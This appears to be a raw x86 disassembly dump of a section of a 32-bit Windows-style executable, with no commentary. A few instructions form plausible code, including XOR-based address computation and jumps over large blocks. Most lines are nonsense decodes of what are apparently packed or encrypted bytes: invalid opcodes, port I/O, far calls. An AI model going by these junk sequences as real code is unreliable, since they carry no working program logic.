  417e5e:	cmp    DWORD PTR ds:0x42a7f1,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	(bad)  
  417e8d:	cmp    al,0xeb
  417e8f:	adc    BYTE PTR [ebp+0x1e],bh
  417e92:	aaa    
  417e93:	jg     0x417f0d
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	arpl   WORD PTR [esi+eax*4],ax
  417e9c:	mov    dl,0xfa
  417e9e:	sub    bh,al
  417ea0:	mov    dl,0x25
  417ea2:	pop    esi
  417ea3:	rol    dl,cl
  417ea5:	loopne 0x417e9e
  417ea7:	cmp    eax,0x838bae5a
  417eac:	mov    bl,0xb9
  417eae:	add    al,0x58
  417eb0:	stc    
  417eb1:	jmp    0x417e65
  417eb3:	arpl   WORD PTR [edi-0x57],di
  417eb6:	jnp    0x417ec2
  417eb8:	xor    al,0x74
  417eba:	shr    DWORD PTR [eax],1
  417ebc:	inc    ebp
  417ebd:	dec    ebx
  417ebe:	jg     0x417e67
  417ec0:	pop    ss
  417ec1:	popf   
  417ec2:	sbb    ecx,DWORD PTR [eax+0xf]
  417ec5:	in     eax,0x93
  417ec7:	cdq    
  417ec8:	(bad)  
  417eca:	loop   0x417eda
  417ecc:	jmp    0xe959f166
  417ed1:	fcmovnbe st,st(7)
  417ed3:	jnp    0x417f3f
  417ed5:	mov    al,ds:0x50d78966
  417eda:	inc    edi
  417edb:	repz mov ebx,0x270684df
  417ee1:	shl    ecx,0x7a
  417ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee5:	cli    
  417ee6:	(bad)  
  417ee7:	fisttp DWORD PTR [edx+0x19]
  417eea:	rol    DWORD PTR [edi],0x4d
  417eed:	cmp    edi,DWORD PTR [ebp-0x105003d9]
  417ef3:	mov    ecx,0xa1ff204f
  417ef8:	adc    edx,DWORD PTR [ecx+0x6645a896]
  417efe:	mov    WORD PTR [eax-0x3b],?
  417f01:	sub    eax,DWORD PTR [eax-0x1f]
  417f04:	cmp    BYTE PTR [edi],cl
  417f06:	std    
  417f07:	and    BYTE PTR [eax-0x5c],bl
  417f0a:	(bad)  
  417f0b:	push   ebp
  417f0c:	(bad)  
  417f0d:	in     al,0x9f
  417f0f:	test   bh,cl
  417f11:	inc    esi
  417f12:	out    dx,al
  417f13:	inc    eax
  417f14:	outs   dx,DWORD PTR ds:[esi]
  417f15:	jae    0x417f14
  417f17:	fmul   st(1),st
  417f19:	(bad)
  417f1c:	xchg   edx,eax
  417f1d:	mov    bh,0x2c
  417f1f:	(bad)  
  417f20:	pop    ebp
  417f21:	or     al,0x5a
  417f23:	inc    BYTE PTR [ecx-0x37]
  417f26:	xor    eax,0x50782891
  417f2b:	pusha  
  417f2c:	nop
  417f2d:	or     al,0x39
  417f2f:	in     al,dx
  417f30:	sahf   
  417f31:	xor    BYTE PTR [edx-0x193d74b9],ch
  417f37:	adc    edx,ecx
  417f39:	mov    DWORD PTR [edi+0x58],ebp
  417f3c:	aas    
  417f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f3e:	shl    DWORD PTR [ebp-0x4c072ef7],0x85
  417f45:	or     ebx,ebp
  417f47:	aam    0x1f
  417f49:	mov    esi,0xcc30d010
  417f4e:	xchg   edi,eax
  417f4f:	repz out dx,al
  417f51:	jmp    0x417f1c
  417f53:	adc    dh,cl
  417f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f56:	sar    BYTE PTR [ebx+ebp*1],1
  417f59:	push   cs
  417f5a:	int3   
  417f5b:	xchg   ecx,eax
  417f5c:	xchg   BYTE PTR [edi+0x71],ch
  417f5f:	jbe    0x417f85
  417f61:	push   cs
  417f62:	push   es
  417f63:	neg    ah
  417f65:	pop    ebx
  417f66:	cmp    ch,bl
  417f68:	mov    esp,0xc5664a41
  417f6d:	out    0x48,al
  417f6f:	pusha  
  417f70:	or     eax,0x3b004b9b
  417f75:	push   edi
  417f76:	dec    ebp
  417f77:	mov    eax,0x43ed94b4
  417f7c:	pop    eax
  417f7d:	mov    edx,0xfd9ed516
  417f82:	mov    dh,BYTE PTR [edx]
  417f84:	test   eax,0x24d9cc29
  417f89:	test   al,0x2c
  417f8b:	retf   0x85a4
  417f8e:	(bad)  
  417f8f:	jns    0x417f33
  417f91:	mov    ds,WORD PTR [ecx]
  417f93:	sub    BYTE PTR [ebx],bh
  417f95:	ds mov ebp,0x131c40cc
  417f9b:	loop   0x417f60
  417f9d:	leave  
  417f9e:	xor    DWORD PTR ds:0xd6f83158,esp
  417fa4:	in     eax,0x90
  417fa6:	(bad)
  417fa9:	scas   eax,DWORD PTR es:[edi]
  417faa:	push   ebx
  417fab:	xor    DWORD PTR [ebx-0x26],esp
  417fae:	jbe    0x41800c
  417fb0:	adc    ebx,DWORD PTR [ebx]
  417fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fb3:	push   ebx
  417fb4:	loope  0x417f97
  417fb6:	dec    esi
  417fb7:	jl     0x417f39
  417fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fba:	pop    esi
  417fbb:	jbe    0x418026
  417fbd:	sub    al,0xd8
  417fbf:	bts    DWORD PTR [esi+0x14],ecx
  417fc3:	arpl   WORD PTR [eax-0x191e5ae4],sp
  417fc9:	mov    esp,0x57e024d1
  417fce:	dec    ecx
  417fcf:	arpl   WORD PTR [edi+ecx*1],di
  417fd2:	sbb    DWORD PTR ds:0x8dc72048,ebx
  417fd8:	lea    eax,[ecx]
  417fda:	add    DWORD PTR [ebp-0x1fe89675],0x70
  417fe1:	std    
  417fe2:	push   ds
  417fe3:	daa    
  417fe4:	mov    dl,0x21
  417fe6:	add    esi,DWORD PTR [ebx]
  417fe8:	dec    edi
  417fe9:	add    esi,DWORD PTR [eax]
  417feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fec:	sub    bh,dl
  417fee:	(bad)  
  417fef:	push   esi
  417ff0:	fs mul edi
  417ff3:	sar    esi,cl
  417ff5:	pop    ebx
  417ff6:	aad    0x4f
  417ff8:	call   0x7602:0x4b8706a5
  417fff:	push   ebp
  418000:	or     dh,al
  418002:	das    
  418003:	in     eax,0xff
  418005:	mov    edx,0xded1b19e
  41800a:	mov    ebp,0x79d18bcc
  41800f:	cdq    
  418010:	mov    edi,0xfc42dd47
  418015:	das    
  418016:	mov    cl,0x22
  418018:	adc    DWORD PTR [ebp+0x12cb00c7],ebx
  41801e:	pop    ebp
  41801f:	pushf  
  418020:	xchg   edx,eax
  418021:	stc    
  418022:	jmp    0xbfb0:0xa4302dbd
  418029:	mov    cl,0x1c
  41802b:	xor    edi,DWORD PTR [ecx+0x7]
  41802e:	sub    DWORD PTR [esi],esi
  418030:	push   0xffffff83
  418032:	fwait
  418033:	stc    
  418034:	jmp    0x61e3:0x424081ff
  41803b:	and    BYTE PTR [esi],ah
  41803d:	xchg   BYTE PTR fs:[edi-0xfd2dc4e],ch
  418044:	jecxz  0x418031
  418046:	rcr    BYTE PTR [ebp+0x35],1
  418049:	xchg   edx,eax
  41804a:	add    al,0x11
  41804c:	cli    
  41804d:	lea    ebp,[eax-0x30]
  418050:	sub    ch,BYTE PTR [esi]
  418052:	fdivp  st(4),st
  418054:	jg     0x41801f
  418056:	outs   dx,BYTE PTR ds:[esi]
  418057:	mov    esi,0x7a7b0d4b
  41805c:	and    ebx,DWORD PTR [edx+0x43]
  41805f:	add    DWORD PTR [edx+eiz*1-0xb],ebx
  418063:	and    eax,0xd5a884f5
  418068:	mov    dh,0x59
  41806a:	add    BYTE PTR [ebx],cl
  41806c:	sbb    eax,ebx
  41806e:	ror    BYTE PTR [ecx+0x17],cl
  418071:	ins    DWORD PTR es:[edi],dx
  418072:	test   al,0x60
  418074:	jl     0x418066
  418076:	stos   BYTE PTR es:[edi],al
  418077:	stos   BYTE PTR es:[edi],al
  418078:	ja     0x418033
  41807a:	ss push ebx
  41807c:	mov    ss,ebp
  41807e:	fmul   QWORD PTR [eax+0xd]
  418081:	cdq    
  418082:	aam    0x46
  418084:	and    ecx,esi
  418086:	mov    cl,0xb9
  418088:	pop    ebx
  418089:	sub    eax,0xd945bd37
  41808e:	jb     0x41803a
  418090:	dec    ebx
  418091:	clc    
  418092:	sub    eax,0xcfbed460
  418097:	sub    eax,0x20f90049
  41809c:	sbb    eax,DWORD PTR [edx+0x4eb6ad2f]
  4180a2:	push   ss
  4180a3:	iret   
  4180a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180a5:	hlt    
  4180a6:	jmp    DWORD PTR [ebp-0x52]
  4180a9:	add    ah,ah
  4180ab:	movhps QWORD PTR [edx+0x4a],xmm1
  4180af:	xor    eax,0x864e0caf
  4180b4:	xchg   ebx,eax
  4180b5:	add    al,0x56
  4180b7:	into   
  4180b8:	pop    edx
  4180b9:	retf   0x3bea
  4180bc:	call   0x82d7c229
  4180c1:	imul   edi,DWORD PTR [esi],0x2bddc915
  4180c7:	ja     0x418059
  4180c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180ca:	push   0x7a
  4180cc:	leave  
  4180cd:	dec    esi
  4180ce:	push   esi
  4180cf:	add    ch,BYTE PTR [edx]
  4180d1:	out    dx,eax
  4180d2:	xchg   ebp,eax
  4180d3:	xor    al,0xc7
  4180d5:	retf   
  4180d6:	dec    ecx
  4180d7:	cmp    al,0xd9
  4180d9:	xor    al,0x29
  4180db:	sub    DWORD PTR [edx],ebx
  4180dd:	push   cs
  4180de:	lods   al,BYTE PTR ds:[esi]
  4180df:	and    al,0xa
  4180e1:	out    dx,al
  4180e2:	cdq    
  4180e3:	pop    ecx
  4180e4:	and    dl,0xb4
  4180e7:	ret    
  4180e8:	sbb    BYTE PTR [esi],bl
  4180ea:	xchg   DWORD PTR [esi-0x4efb4125],ecx
  4180f0:	or     al,0x8e
  4180f2:	lods   al,BYTE PTR ds:[esi]
  4180f3:	mov    bl,0x37
  4180f5:	dec    ebp
  4180f6:	fcom   QWORD PTR [esi-0x43]
  4180f9:	mov    esp,0x183c17d0
  4180fe:	leave  
  4180ff:	jp     0x41817b
  418101:	adc    BYTE PTR [esp+ebx*1+0x1a],0xcc
  418106:	not    DWORD PTR [eax+0x2d863a92]
  41810c:	jb     0x418125
  41810e:	daa    
  41810f:	cs in  al,dx
  418111:	jns    0x4180cf
  418113:	test   BYTE PTR [eax+0x72],bl
  418116:	daa    
  418117:	pop    ecx
  418118:	fidivr DWORD PTR [edi-0x15]
  41811b:	scas   al,BYTE PTR es:[edi]
  41811c:	(bad)  
  41811d:	pop    eax
  41811e:	xchg   ecx,eax
  41811f:	fild   QWORD PTR [ecx-0x29]
  418122:	pop    ebx
  418123:	and    ebx,ebp
  418125:	mov    ch,0x5c
  418127:	std    
  418128:	(bad)  
  418129:	fwait
  41812a:	scas   al,BYTE PTR es:[edi]
  41812b:	inc    edx
  41812c:	push   0x571026c
  418131:	adc    DWORD PTR [edx],eax
  418133:	loope  0x4180e0
  418135:	add    DWORD PTR [esi],eax
  418137:	pop    ebx
  418138:	push   cs
  418139:	mov    edi,DWORD PTR es:[edx+eax*8+0x4b]
  41813e:	in     al,0xaf
  418140:	cdq    
  418141:	hlt    
  418142:	std    
  418143:	mov    WORD PTR [esi+0x8],ss
  418146:	leave  
  418147:	sub    al,0x6b
  418149:	pop    ebx
  41814a:	cmp    dh,bh
  41814c:	dec    edx
  41814d:	jns    0x418176
  41814f:	sbb    ch,BYTE PTR [edi]
  418151:	xor    eax,0x5d77c94f
  418156:	xchg   edi,eax
  418157:	inc    esi
  418158:	enter  0x74cf,0xf7
  41815c:	pop    ebx
  41815d:	push   esp
  41815e:	sbb    eax,0x67a0873e
  418163:	mov    fs,esi
  418165:	in     eax,0x77
  418167:	mov    bl,0xf6
  418169:	mov    dl,0x66
  41816b:	and    BYTE PTR [esp+eiz*4+0x47],dh
  41816f:	xchg   edx,eax
  418170:	mov    al,ds:0x7b8c8462
  418175:	js     0x41816e
  418177:	lods   al,BYTE PTR ds:[esi]
  418178:	outs   dx,DWORD PTR ds:[esi]
  418179:	cmp    al,0xb6
  41817b:	js     0x4181da
  41817d:	add    eax,0x536c4267
  418182:	std    
  418183:	fst    DWORD PTR [esi+0x1f]
  418186:	sbb    al,0xc1
  418188:	jle    0x418194
  41818a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41818b:	mov    DWORD PTR [edi],ecx
  41818d:	add    DWORD PTR [ecx-0x26],ebx
  418190:	xor    edi,esp
  418192:	xchg   eax,ebx
  418194:	(bad)  
  418196:	mov    esi,DWORD PTR [ebp+0xc]
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	pushf  
  4181b8:	adc    esp,esp
  4181ba:	xchg   edi,eax
  4181bb:	sbb    DWORD PTR [edi+edi*2],esi
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x41816e
  4181c4:	add    bh,ah
  4181c6:	mov    ah,0x3c
  4181c8:	mov    cl,0x26
  4181ca:	xchg   DWORD PTR [edi+0x47d53c5a],edx
  4181d0:	fisubr WORD PTR [ecx]
  4181d2:	add    ebx,DWORD PTR [edx-0x6b22980e]
  4181d8:	mov    ah,0xf9
  4181da:	push   edi
  4181db:	popf   
  4181dc:	data16 shl cl,1
  4181df:	push   esp
  4181e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181e1:	mov    ah,0x41
  4181e3:	sahf   
  4181e4:	dec    esp
  4181e5:	hlt    
  4181e6:	sub    al,0x17
  4181e8:	cli    
  4181e9:	jle    0x41817b
  4181eb:	cmp    dl,BYTE PTR [ecx]
  4181ed:	inc    edx
  4181ee:	inc    ecx
  4181ef:	cli    
  4181f0:	and    BYTE PTR [edx-0x66],dh
  4181f3:	xor    ch,BYTE PTR [eax+0x15]
  4181f6:	push   esp
  4181f7:	xor    al,0xc
  4181f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181fa:	add    eax,0x7512535b
  4181ff:	inc    ebx
  418200:	daa    
  418201:	aas    
  418202:	adc    al,0xe7
  418204:	daa    
  418205:	leave  
  418206:	xchg   ah,bl
  418208:	test   DWORD PTR [esi+0x6],ebx
  41820b:	push   cs
  41820c:	fst    st(2)
  41820e:	push   edx
  41820f:	push   esp
  418210:	(bad)  
  418211:	jmp    0xf68c:0x8c468e4a
  418218:	out    dx,eax
  418219:	add    dh,BYTE PTR [esi+0x32]
  41821c:	adc    al,0x7d
  41821e:	repnz push ss
  418220:	je     0x418298
  418222:	push   es
  418223:	xchg   edx,eax
  418224:	mov    ds:0x385e57b2,eax
  418229:	inc    ebp
  41822a:	jno    0x418206
  41822c:	in     al,0xd
  41822e:	jno    0x418201
  418230:	xor    esp,DWORD PTR [edi-0x25f539af]
  418236:	mov    cl,0x2d
  418238:	pusha  
  418239:	jp     0x4182af
  41823b:	outs   dx,BYTE PTR ds:[esi]
  41823c:	pop    eax
  41823d:	das    
  41823e:	add    dh,BYTE PTR [edi]
  418240:	xlat   BYTE PTR ds:[ebx]
  418241:	add    BYTE PTR [esi],0x93
  418244:	dec    edi
  418245:	addr16 xchg ecx,eax
  418247:	cwde   
  418248:	mov    cl,0xd3
  41824a:	dec    ecx
  41824b:	and    eax,0xd12cc23e
  418250:	mov    dl,0x63
  418252:	addr16 (bad) 
  418254:	mov    ecx,0x262cc183
  418259:	mov    dl,0x8c
  41825b:	jbe    0x4182be
  41825d:	out    0x83,eax
  41825f:	ins    BYTE PTR es:[edi],dx
  418260:	add    al,0x3d
  418262:	or     DWORD PTR [esi-0x7d],esp
  418265:	or     ebx,eax
  418267:	lock addr16 pop esi
  41826a:	jg     0x4182bc
  41826c:	popa   
  41826d:	pop    edx
  41826e:	sub    dl,BYTE PTR [edx+ebp*8+0x56]
  418272:	inc    eax
  418273:	pop    eax
  418274:	sbb    esi,eax
  418276:	int3   
  418277:	test   eax,0x84382279
  41827c:	aas    
  41827d:	push   ss
  41827e:	jb     0x418207
  418280:	je     0x41822c
  418282:	sti    
  418283:	cmp    eax,0x3b626770
  418288:	scas   eax,DWORD PTR es:[edi]
  418289:	xlat   BYTE PTR ds:[ebx]
  41828a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41828b:	adc    BYTE PTR [ecx-0x35],bl
  41828e:	dec    ecx
  41828f:	dec    esp
  418290:	push   0x1b
  418292:	and    BYTE PTR [edi],dh
  418294:	shl    BYTE PTR [ebx+0x42],0xae
  418298:	or     eax,0x64ce7247
  41829d:	sbb    BYTE PTR [esi+0x59],ah
  4182a0:	adc    BYTE PTR [ecx-0x5bed8efa],al
  4182a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182a7:	mov    gs,WORD PTR [eax+0x38993381]
  4182ad:	or     al,0x98
  4182af:	push   cs
  4182b0:	stos   DWORD PTR es:[edi],eax
  4182b1:	loope  0x418331
  4182b3:	mov    ?,WORD PTR [eax]
  4182b5:	add    eax,DWORD PTR [ecx+ebp*4-0x36eca487]
  4182bc:	jbe    0x4182b8
  4182be:	test   eax,0xe8385f8d
  4182c3:	mov    ch,0xc
  4182c5:	das    
  4182c6:	sbb    BYTE PTR [esi+0x6d928098],dh
  4182cc:	xchg   DWORD PTR [esi+0x7368d9b5],edx
  4182d2:	pop    esi
  4182d3:	mov    dl,0x61
  4182d5:	xchg   ebx,eax
  4182d6:	outs   dx,DWORD PTR ds:[esi]
  4182d7:	(bad)  
  4182d9:	outs   dx,BYTE PTR ds:[esi]
  4182da:	and    BYTE PTR ds:0xeef2a2bf,ah
  4182e0:	fldl2e 
  4182e2:	sti    
  4182e3:	and    esi,DWORD PTR [ebp-0x68]
  4182e6:	mov    eax,ds:0xebf1688e
  4182eb:	not    BYTE PTR [edi-0x675ec72]
  4182f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182f2:	aad    0x9c
  4182f4:	dec    esi
  4182f5:	inc    eax
  4182f6:	retf   0x4498
  4182f9:	cdq    
  4182fa:	mov    al,0xc9
  4182fc:	jo     0x418353
  4182fe:	retf   
  4182ff:	pop    esp
  418300:	loopne 0x418285
  418302:	pop    esi
  418303:	push   esi
  418304:	fstp   TBYTE PTR [eax+esi*8-0x5f38c8ff]
  41830b:	ror    BYTE PTR [esi+ecx*8],cl
  41830e:	imul   eax,eax,0x24
  418311:	(bad)  
  418312:	push   ebp
  418313:	adc    eax,0xf8ce1ce6
  418318:	ror    BYTE PTR [ecx],0xf
  41831b:	es jb  0x418315
  41831e:	mov    DWORD PTR [ebx],ecx
  418320:	ja     0x4182f7
  418322:	sbb    edi,ecx
  418324:	or     ebp,DWORD PTR [ebx+0x18]
  418327:	out    0xb1,al
  418329:	push   cs
  41832a:	and    DWORD PTR [eax+0xa],0xc3cf7928
  418331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418332:	mov    edi,0x828c294c
  418337:	cs push esp
  418339:	mov    ecx,0x7e94384f
  41833e:	fisubr WORD PTR [edx+0x31a89989]
  418344:	add    DWORD PTR [esi+0x33],ebx
  418347:	lods   eax,DWORD PTR ds:[esi]
  418348:	ds sub eax,0x32158a91
  41834e:	mov    ds:0x8c29d30e,eax
  418353:	push   eax
  418354:	and    ah,BYTE PTR [ecx+0x528ca05f]
  41835a:	shr    DWORD PTR [ebx],cl
  41835c:	adc    dl,BYTE PTR [edi-0x23]
  41835f:	cdq    
  418360:	into   
  418361:	(bad)  
  418362:	imul   edi,DWORD PTR [esi+0x713f45a6],0x54
  418369:	sbb    dl,BYTE PTR [esi-0x57]
  41836c:	cwde   
  41836d:	pop    eax
  41836e:	bound  eax,QWORD PTR [ecx+ebx*2-0x6e5793e7]
  418375:	or     esp,ebx
  418377:	ret    
  418378:	dec    ebx
  418379:	pop    esi
  41837a:	push   edx
  41837b:	inc    eax
  41837c:	icebp  
  41837d:	sub    BYTE PTR ss:[edx-0x66],bh
  418381:	adc    eax,0x8db90152
  418386:	dec    ecx
  418387:	push   0x3b68b28c
  41838c:	inc    esp
  41838d:	and    al,0x6d
  41838f:	pop    ds
  418390:	mov    ah,0xa8
  418392:	mov    ebp,0x34c1ce55
  418397:	test   DWORD PTR [edx],ebx
  418399:	push   ebx
  41839a:	cmp    DWORD PTR [ebx+0x4ff9707a],0xffffff94
  4183a1:	fdivr  DWORD PTR [esi+0x1e]
  4183a4:	mov    ah,0x17
  4183a6:	into   
  4183a7:	sar    edi,1
  4183a9:	push   0x141776d7
  4183ae:	add    DWORD PTR [esi],ebx
  4183b0:	data16 lods al,BYTE PTR ds:[esi]
  4183b2:	push   0x21
  4183b4:	in     al,0xc8
  4183b6:	jle    0x418349
  4183b8:	xchg   edx,eax
  4183b9:	aas    
  4183ba:	add    esp,esi
  4183bc:	push   es
  4183bd:	leave  
  4183be:	jmp    0x418406
  4183c0:	fcomp  QWORD PTR [ecx]
  4183c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183c3:	pop    ss
  4183c4:	inc    esp
  4183c5:	lea    ecx,[esp+ecx*1+0x4bf019]
  4183cc:	push   edx
  4183cd:	add    ch,0x76
  4183d0:	mov    al,0x9b
  4183d2:	stos   BYTE PTR es:[edi],al
  4183d3:	dec    eax
  4183d4:	sub    al,0xd2
  4183d6:	fdiv   st,st(6)
  4183d8:	jne    0x418408
  4183da:	popf   
  4183db:	pop    ecx
  4183dc:	sub    ebp,eax
  4183de:	aad    0xb0
  4183e0:	pop    edx
  4183e1:	add    eax,0xfd6d68a1
  4183e6:	push   esi
  4183e7:	dec    edx
  4183e8:	fdivr  st(7),st
  4183ea:	in     al,dx
  4183eb:	js     0x4183b4
  4183ed:	out    dx,eax
  4183ee:	imul   ebp,esi,0x66
  4183f1:	loope  0x418460
  4183f3:	inc    edx
  4183f4:	ja     0x418398
  4183f6:	enter  0x3b08,0x2f
  4183fa:	sbb    edx,edx
  4183fc:	inc    edx
  4183fd:	pop    esp
  4183fe:	out    0xee,al
  418400:	dec    edi
  418401:	addr16 nop
  418403:	sti    
  418404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418405:	push   0x681e63af
  41840a:	js     0x418459
  41840c:	loopne 0x41841c
  41840e:	lahf   
  41840f:	pop    edx
  418410:	aaa    
  418411:	push   ds
  418412:	daa    
  418413:	mov    BYTE PTR [ebx],ch
  418415:	sub    ebp,DWORD PTR [esi-0x5dec7126]
  41841b:	cmp    dh,BYTE PTR ss:[ebx-0x24]
  41841f:	adc    eax,0x1f23769f
  418424:	push   cs
  418425:	pop    ecx
  418426:	imul   eax,DWORD PTR [ecx-0x69],0x2471824f
  41842d:	pop    eax
  41842e:	lahf   
  41842f:	js     0x4183b7
  418431:	sbb    esp,edx
  418433:	jae    0x418470
  418435:	test   eax,0x97c4842f
  41843a:	and    ecx,DWORD PTR [eax+0x1f]
  41843d:	and    al,0xb0
  41843f:	shr    esi,1
  418441:	xchg   ebp,eax
  418442:	push   esp
  418443:	sbb    al,0x7f
  418445:	jge    0x41840a
  418447:	push   edi
  418448:	sbb    eax,0x796f16db
  41844d:	imul   ebx,edx,0x21
  418450:	daa    
  418451:	cmp    eax,0xdb9dff41
  418456:	mov    ?,WORD PTR [edx+edi*2+0x2e]
  41845a:	and    al,0x9e
  41845c:	sbb    DWORD PTR [eax],0xb17a34ad
  418462:	ror    BYTE PTR [ebp-0x1e20faf5],1
  418468:	mov    bl,0xad
  41846a:	retf   
  41846b:	arpl   WORD PTR [esi-0x13],si
  41846e:	or     eax,0xafb507a5
  418473:	xor    edi,DWORD PTR [ecx-0x39]
  418476:	mov    dl,0xbf
  418478:	ins    BYTE PTR es:[edi],dx
  418479:	sbb    eax,edx
  41847b:	or     dh,0x6f
  41847e:	inc    ebx
  41847f:	(bad)  
  418480:	repz cmp eax,0x56879373
  418486:	and    dh,bh
  418488:	int    0xaa
  41848a:	inc    esp
  41848b:	inc    ebp
  41848c:	out    dx,eax
  41848d:	mov    WORD PTR [ecx-0x292d2680],fs
  418493:	mov    ?,WORD PTR [ecx]
  418495:	test   BYTE PTR [edi+0x5a],dh
  418498:	mov    ebx,0x580d0658
  41849d:	push   0xffffffd2
  41849f:	fcmovne st,st(0)
  4184a1:	popf   
  4184a2:	fld    QWORD PTR [ebp-0x252043ed]
  4184a8:	mov    cl,0xf2
  4184aa:	sbb    DWORD PTR [ecx],edx
  4184ac:	shl    DWORD PTR [esi],1
  4184ae:	dec    edi
  4184af:	sub    bh,bl
  4184b1:	in     eax,dx
  4184b2:	and    ch,0xe4
  4184b5:	sbb    eax,0x98a90637
  4184ba:	in     eax,dx
  4184bb:	aad    0xd0
  4184bd:	xor    ebx,DWORD PTR [eax]
  4184bf:	daa    
  4184c0:	cmp    ecx,0xf89c8528
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0xafec6d48
  4184e3:	mov    gs,WORD PTR [ebx+0x7f39140f]
  4184e9:	js     0x418566
  4184eb:	jle    0x418565
  4184ed:	js     0x41850f
  4184ef:	cmp    eax,0x9e48739b
  4184f4:	sub    BYTE PTR [edx+0x1dd75ee7],ch
  4184fa:	adc    ah,ah
  4184fc:	jp     0x418550
  4184fe:	add    esi,DWORD PTR [esi-0x63]
  418501:	call   0xffd3:0x63d9d84d
  418508:	retf   0xba14
  41850b:	jmp    0x418579
  41850d:	add    eax,0x312d7043
  418512:	push   es
  418513:	xlat   BYTE PTR ds:[ebx]
  418514:	sbb    ecx,ecx
  418516:	sbb    cl,BYTE PTR [eax]
  418518:	scas   al,BYTE PTR es:[edi]
  418519:	fld    QWORD PTR [edx-0x4e1e7598]
  41851f:	int3   
  418520:	xchg   BYTE PTR [edi+0x3e346a3e],dl
  418526:	inc    esi
  418527:	xor    eax,0x102e9771
  41852c:	or     ch,BYTE PTR [ecx+0x6]
  41852f:	add    al,0x2e
  418531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418532:	dec    ebx
  418533:	sbb    ebx,esp
  418535:	xor    BYTE PTR [ebx],0x9f
  418538:	addr16 aam 0x9d
  41853b:	popf   
  41853c:	mov    es,WORD PTR [ebp+0x7d]
  41853f:	push   ss
  418540:	or     dl,ah
  418542:	fsubr  DWORD PTR [edi+0x3939e0d7]
  418548:	push   esi
  418549:	and    BYTE PTR [eax],ch
  41854b:	out    dx,eax
  41854c:	pop    DWORD PTR [esp+eax*2-0x4df7d965]
  418553:	mov    al,ds:0xa712723f
  418558:	jae    0x4184dc
  41855a:	test   DWORD PTR [ecx-0x71c60b22],ebp
  418560:	stos   BYTE PTR es:[edi],al
  418561:	adc    DWORD PTR [ebx-0x160fe740],0xffffff90
  418568:	inc    ebp
  418569:	xor    BYTE PTR [ebx],ch
  41856b:	test   BYTE PTR [ebx],ah
  41856d:	std    
  41856e:	sbb    al,0x48
  418570:	mov    edi,0xc0a0971c
  418575:	inc    ebx
  418576:	mov    edx,0x90c5e7ef
  41857b:	xor    DWORD PTR [edx-0x4f614d5c],ebp
  418581:	in     al,dx
  418582:	xor    BYTE PTR [ebx],cl
  418584:	repnz ss or al,0x6a
  418588:	and    al,0xea
  41858a:	or     al,0xf2
  41858c:	(bad)  
  41858d:	icebp  
  41858e:	ds dec ebp
  418590:	adc    dh,BYTE PTR [ecx]
  418592:	mov    DWORD PTR [edx],eax
  418594:	sub    eax,0xbd732fb5
  418599:	rol    ah,1
  41859b:	inc    esp
  41859c:	inc    eax
  41859d:	jmp    0x323e47b3
  4185a2:	mov    dh,0xfa
  4185a5:	int3   
  4185a6:	ret    0x8d87
  4185a9:	xchg   DWORD PTR [edi+ebp*1],ebx
  4185ac:	enter  0xb4c9,0xfe
  4185b0:	aas    
  4185b1:	add    cl,dl
  4185b3:	push   edi
  4185b4:	loopne 0x41858d
  4185b6:	imul   ebp,DWORD PTR [ecx-0x60],0xb
  4185ba:	push   edi
  4185bb:	adc    eax,0xa5bbb10d
  4185c0:	out    dx,al
  4185c1:	and    eax,0x445970e8
  4185c6:	mov    dh,0xdf
  4185c8:	dec    ebp
  4185c9:	or     bl,ch
  4185cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185cc:	scas   eax,DWORD PTR es:[edi]
  4185cd:	loope  0x4185b2
  4185cf:	push   esi
  4185d0:	sub    dl,BYTE PTR [edx-0x67]
  4185d3:	adc    esp,DWORD PTR [ecx-0x74]
  4185d6:	and    DWORD PTR [eax],ebp
  4185d8:	push   esi
  4185d9:	cs xor al,0x16
  4185dc:	add    DWORD PTR [esi+0x3a],esi
  4185df:	jg     0x4185bd
  4185e1:	(bad)  
  4185e2:	sbb    esp,DWORD PTR [edx-0x4f]
  4185e5:	sbb    DWORD PTR [ebp-0x33],esp
  4185e8:	push   esi
  4185e9:	push   esi
  4185ea:	fist   DWORD PTR [ebp-0x35]
  4185ed:	push   edx
